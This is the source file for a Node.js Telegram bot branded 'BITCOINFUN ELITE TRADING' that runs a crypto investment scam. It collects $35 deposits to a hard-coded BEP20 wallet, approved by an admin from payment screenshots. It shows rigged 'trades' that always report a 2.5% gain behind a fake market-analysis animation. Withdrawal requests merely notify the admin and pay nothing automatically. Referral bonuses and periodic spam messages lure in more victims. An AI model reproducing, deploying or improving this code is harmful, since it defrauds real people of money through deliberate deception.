require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');
const cron = require('node-cron');

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID; 
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

// Temporary Database (Resets on Render Free Tier Restart)
const db = { users: {} };
bot.use(session());

// --- WELCOME & REFERRAL SYSTEM ---
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const refId = ctx.startPayload;

    if (!db.users[userId]) {
        db.users[userId] = { 
            balance: 0, deposited: 0, lastPlayed: 0, referrals: 0,
            username: ctx.from.username || ctx.from.first_name 
        };
        // Referral Logic: $10 for the inviter
        if (refId && refId !== userId && db.users[refId]) {
            db.users[refId].referrals++;
            db.users[refId].balance += 10;
            bot.telegram.sendMessage(refId, `🎊 <b>Bonus!</b> You earned <b>$10</b> for inviting @${db.users[userId].username}!`, { parse_mode: 'HTML' });
        }
        bot.telegram.sendMessage(ADMIN_ID, `🆕 <b>New User Joined:</b> @${db.users[userId].username} (ID: <code>${userId}</code>)`, { parse_mode: 'HTML' });
    }

    const welcomeMsg = 
        `🔥 <b>BITCOINFUN ELITE TRADING</b> 🔥\n\n` +
        `🚀 <i>The system is live and ready for gains.</i>\n\n` +
        `💎 <b>EXCLUSIVE:</b> Deposit <b>$35</b> → Get <b>35 $BT Tokens</b>!\n\n` +
        `💰 Balance: <b>$${db.users[userId].balance.toFixed(2)}</b>\n` +
        `👥 Referrals: <b>${db.users[userId].referrals}</b>\n\n` +
        `👇 <b>Choose your path:</b>`;

    ctx.replyWithHTML(welcomeMsg, Markup.inlineKeyboard([
        [Markup.button.callback('💳 DEPOSIT $35 (BEP20)', 'deposit')],
        [Markup.button.callback('📈 TRADE (UP/DOWN)', 'game')],
        [Markup.button.callback('💸 WITHDRAW', 'withdraw')],
        [Markup.button.callback('🤝 INVITE & EARN $10', 'refer')]
    ]));
});

// --- DEPOSIT & SCREENSHOT APPROVAL ---
bot.action('deposit', (ctx) => {
    ctx.replyWithHTML(
        `🚀 <b>DEPOSIT $35 BEP20</b>\n\n` +
        `Network: <b>Binance Smart Chain (BEP20)</b>\n` +
        `Address:\n<code>${BEP20_ADDRESS}</code>\n\n` +
        `⚠️ <i>Send $35+ and click the button below to upload your screenshot.</i>`,
        Markup.inlineKeyboard([[Markup.button.callback('📸 I have sent the payment', 'send_ss')]])
    );
});

bot.action('send_ss', (ctx) => {
    db.users[ctx.from.id].waitingForSS = true;
    ctx.reply("Please upload your payment screenshot (Photo or File) now.");
});

bot.on(['photo', 'document'], async (ctx) => {
    const userId = ctx.from.id;
    if (db.users[userId]?.waitingForSS) {
        db.users[userId].waitingForSS = false;
        const fileId = ctx.message.photo ? ctx.message.photo[ctx.message.photo.length - 1].file_id : ctx.message.document.file_id;
        
        ctx.replyWithHTML("⏳ <b>Our system is verifying your payment...</b>\n\nWe are checking the blockchain. You will be notified shortly! 🥳");
        
        bot.telegram.sendPhoto(ADMIN_ID, fileId, {
            caption: `💰 <b>DEPOSIT REQUEST</b>\nUser: @${ctx.from.username}\nID: <code>${userId}</code>`,
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([[Markup.button.callback('✅ Approve $35', `approve_${userId}_35`)]])
        });
    }
});

bot.action(/approve_(\d+)_(\d+)/, (ctx) => {
    const [_, userId, amount] = ctx.match;
    db.users[userId].balance += parseInt(amount);
    db.users[userId].deposited += parseInt(amount);
    bot.telegram.sendMessage(userId, `🥳 <b>Congratulations!</b>\nYour deposit of $${amount} has been verified!\n\nNew Balance: <b>$${db.users[userId].balance}</b>`, { parse_mode: 'HTML' });
    ctx.editMessageCaption(`✅ Approved $${amount} for user ${userId}`);
});

// --- TRADING LOGIC (30s DELAY + ALWAYS WIN) ---
bot.action('game', (ctx) => {
    const user = db.users[ctx.from.id];
    const cooldown = 12 * 60 * 60 * 1000;
    if (Date.now() - user.lastPlayed < cooldown) {
        const remaining = Math.ceil((cooldown - (Date.now() - user.lastPlayed)) / (60 * 60 * 1000));
        return ctx.answerCbQuery(`⏳ Next round in ${remaining} hours!`, { show_alert: true });
    }
    ctx.reply("📉 <b>Predict BTC Direction:</b>", Markup.inlineKeyboard([
        [Markup.button.callback('🟢 UP', 'start_trade'), Markup.button.callback('🔴 DOWN', 'start_trade')]
    ], { parse_mode: 'HTML' }));
});

bot.action('start_trade', async (ctx) => {
    const user = db.users[ctx.from.id];
    user.lastPlayed = Date.now();
    
    // 30s Visual Animation
    await ctx.editMessageText("⏳ <b>Analyzing Market Trends...</b>", { parse_mode: 'HTML' });
    setTimeout(() => ctx.editMessageText("📊 <b>Checking Liquidity Pool...</b>", { parse_mode: 'HTML' }), 10000);
    setTimeout(() => ctx.editMessageText("🚀 <b>Executing Smart Contract...</b>", { parse_mode: 'HTML' }), 20000);

    setTimeout(() => {
        const profit = user.balance * 0.025; // 2.5% Gain
        user.balance += profit;
        ctx.editMessageText(`🎉 <b>TRADE SUCCESS!</b>\n\nProfit: <b>+$${profit.toFixed(2)}</b>\nBalance: <b>$${user.balance.toFixed(2)}</b>\n\nNext round available in 12 hours.`, { parse_mode: 'HTML' });
    }, 30000);
});

// --- WITHDRAWAL CONTROL ---
bot.action('withdraw', (ctx) => {
    const user = db.users[ctx.from.id];
    ctx.replyWithHTML(`💸 <b>Withdrawal</b>\n\nMin: $30\nLimit: $${user.deposited}\n\nEnter amount to withdraw:`);
    user.waitingForWD = true;
});

bot.on('text', (ctx) => {
    const user = db.users[ctx.from.id];
    if (user?.waitingForWD) {
        const amt = parseFloat(ctx.message.text);
        if (amt > user.deposited) return ctx.reply("❌ Limit Exceeded! You cannot withdraw more than your deposits.");
        if (amt < 30) return ctx.reply("❌ Minimum withdrawal is $30.");
        
        user.waitingForWD = false;
        bot.telegram.sendMessage(ADMIN_ID, `💸 <b>WITHDRAWAL REQUEST</b>\nUser: @${ctx.from.username}\nAmt: $${amt}\nID: <code>${ctx.from.id}</code>`, { parse_mode: 'HTML' });
        ctx.reply("✅ Withdrawal request submitted for Admin approval!");
    }
});

// --- REFERRAL & PING ---
bot.action('refer', (ctx) => {
    const link = `https://t.me/${process.env.BOT_USERNAME}?start=${ctx.from.id}`;
    ctx.replyWithHTML(`🤝 <b>Invite & Earn</b>\n\nGet <b>$10 FREE</b> for every friend who joins!\n\nLink: <code>${link}</code>`);
});

cron.schedule('0 */8 * * *', () => {
    Object.keys(db.users).forEach(uid => bot.telegram.sendMessage(uid, "👋 <b>We miss you!</b>\nTime to grow your balance. Start a new trade now! 🚀", { parse_mode: 'HTML' }));
});

// --- ADMIN STATS ---
bot.command('admin', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    const count = Object.keys(db.users).length;
    const total = Object.values(db.users).reduce((s, u) => s + u.balance, 0);
    ctx.replyWithHTML(`📊 <b>SYSTEM STATS</b>\n\nTotal Users: ${count}\nTotal System Balance: $${total.toFixed(2)}`);
});

// Server & Launch
app.get('/', (req, res) => res.send('Bot Live'));
app.listen(process.env.PORT || 3000, "0.0.0.0");
bot.launch().then(() => console.log("🚀 Elite Bot Live!"));
